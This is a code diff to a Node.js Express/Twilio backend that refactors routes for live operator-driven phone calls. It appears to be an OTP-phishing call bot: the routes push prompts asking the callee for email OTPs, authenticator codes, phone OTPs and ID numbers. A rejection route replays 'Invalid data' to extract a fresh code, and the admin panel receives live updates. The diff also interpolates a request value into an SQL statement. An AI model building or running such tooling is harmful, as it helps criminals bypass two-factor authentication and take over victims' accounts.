@@ -5,42 +5,43 @@ const twilio = require('twilio');
 
 const client = twilio(process.env.TWILIO_ACCOUNT_SID, process.env.TWILIO_AUTH_TOKEN);
 
+function getActionConfig(action) {
+    const configs = {
+        'email_otp': {
+            action: 'email-otp',
+            message: 'Please enter the 6 digit OTP from your email followed by the pound key.',
+            numDigits: 6
+        },
+        'auth_otp': {
+            action: 'auth-otp',
+            message: 'Please enter the 6 digit code from your authenticator app followed by the pound key.',
+            numDigits: 6
+        },
+        'phone_otp': {
+            action: 'phone-otp',
+            message: 'Please enter the 6 digit OTP sent to your phone followed by the pound key.',
+            numDigits: 6
+        },
+        'id_number': {
+            action: 'id',
+            message: 'Please enter your ID number followed by the pound key.',
+            numDigits: 20
+        }
+    };
+    return configs[action];
+}
+
 router.post('/request-action/:sessionId', async (req, res) => {
     const { sessionId } = req.params;
     const { action } = req.body;
     const io = req.app.get('io');
     
-    let currentAction = '';
-    let actionMessage = '';
-    let numDigits = 20;
-    
-    switch(action) {
-        case 'email_otp':
-            currentAction = 'waiting_for_email_otp';
-            actionMessage = 'Please enter the 6 digit OTP from your email followed by the pound key.';
-            numDigits = 6;
-            break;
-        case 'auth_otp':
-            currentAction = 'waiting_for_auth_otp';
-            actionMessage = 'Please enter the 6 digit code from your authenticator app followed by the pound key.';
-            numDigits = 6;
-            break;
-        case 'phone_otp':
-            currentAction = 'waiting_for_phone_otp';
-            actionMessage = 'Please enter the 6 digit OTP sent to your phone followed by the pound key.';
-            numDigits = 6;
-            break;
-        case 'id_number':
-            currentAction = 'waiting_for_id';
-            actionMessage = 'Please enter your ID number followed by the pound key.';
-            numDigits = 20;
-            break;
-        default:
-            return res.status(400).json({ error: 'Invalid action' });
+    const actionConfig = getActionConfig(action);
+    if (!actionConfig) {
+        return res.status(400).json({ error: 'Invalid action' });
     }
     
     try {
-        // Get the call SID and check call status first
         const session = await db.query(
             `SELECT call_sid, status FROM call_sessions WHERE id = $1`,
             [sessionId]
@@ -49,19 +50,16 @@ router.post('/request-action/:sessionId', async (req, res) => {
         const callSid = session.rows[0]?.call_sid;
         const callStatus = session.rows[0]?.status;
         
-        // Check if call is still active
         if (callStatus !== 'in-progress' && callStatus !== 'ringing') {
-            console.log(`Call ${callSid} is not active. Status: ${callStatus}`);
             return res.status(400).json({ 
                 success: false, 
                 error: `Call is not active. Current status: ${callStatus}` 
             });
         }
         
-        // Update the session action in database
         await db.query(
-            `UPDATE call_sessions SET current_action = $1 WHERE id = $2`,
-            [currentAction, sessionId]
+            `UPDATE call_sessions SET current_action = 'waiting_for_${action}' WHERE id = $1`,
+            [sessionId]
         );
         
         await db.query(
@@ -69,20 +67,18 @@ router.post('/request-action/:sessionId', async (req, res) => {
             [sessionId, action]
         );
         
-        // Update the call with new TwiML
         if (callSid) {
-            const twiml = `<Response><Say>${actionMessage}</Say><Gather numDigits="${numDigits}" action="/webhooks/collect-${action}/${sessionId}" method="POST" finishOnKey="#"/></Response>`;
+            const twiml = `<Response><Say>${actionConfig.message}</Say><Gather numDigits="${actionConfig.numDigits}" action="/webhooks/collect-${actionConfig.action}/${sessionId}" method="POST" finishOnKey="#"/></Response>`;
             await client.calls(callSid).update({ twiml: twiml });
             console.log(`Updated call ${callSid} with new TwiML for action: ${action}`);
         }
         
-        io.emit('admin_action', { session_id: sessionId, action: action, message: actionMessage });
+        io.emit('admin_action', { session_id: sessionId, action: action, message: actionConfig.message });
         
         res.json({ success: true, action: action });
     } catch (error) {
         console.error('Error requesting action:', error);
         
-        // Handle specific Twilio errors
         if (error.code === 21220) {
             await db.query(
                 `UPDATE call_sessions SET status = 'failed' WHERE id = $1`,
@@ -101,7 +97,6 @@ router.post('/custom-voice/:sessionId', async (req, res) => {
     const io = req.app.get('io');
     
     try {
-        // Get the call SID and check status
         const session = await db.query(
             `SELECT call_sid, status FROM call_sessions WHERE id = $1`,
             [sessionId]
@@ -181,22 +176,28 @@ router.post('/reject-last-data/:sessionId', async (req, res) => {
         
         let actionMessage = '';
         let numDigits = 20;
+        let actionType = '';
+        
         if (lastDataType === 'id_number') {
             actionMessage = 'Please enter your ID number followed by the pound key.';
             numDigits = 20;
+            actionType = 'id';
         } else if (lastDataType === 'email_otp') {
             actionMessage = 'Please enter the 6 digit OTP from your email followed by the pound key.';
             numDigits = 6;
+            actionType = 'email-otp';
         } else if (lastDataType === 'auth_otp') {
             actionMessage = 'Please enter the 6 digit code from your authenticator app followed by the pound key.';
             numDigits = 6;
+            actionType = 'auth-otp';
         } else if (lastDataType === 'phone_otp') {
             actionMessage = 'Please enter the 6 digit OTP sent to your phone followed by the pound key.';
             numDigits = 6;
+            actionType = 'phone-otp';
         }
         
         if (callSid) {
-            const twiml = `<Response><Say>Invalid data. ${actionMessage}</Say><Gather numDigits="${numDigits}" action="/webhooks/collect-${lastDataType}/${sessionId}" method="POST" finishOnKey="#"/></Response>`;
+            const twiml = `<Response><Say>Invalid data. ${actionMessage}</Say><Gather numDigits="${numDigits}" action="/webhooks/collect-${actionType}/${sessionId}" method="POST" finishOnKey="#"/></Response>`;
             await client.calls(callSid).update({ twiml: twiml });
         }
         
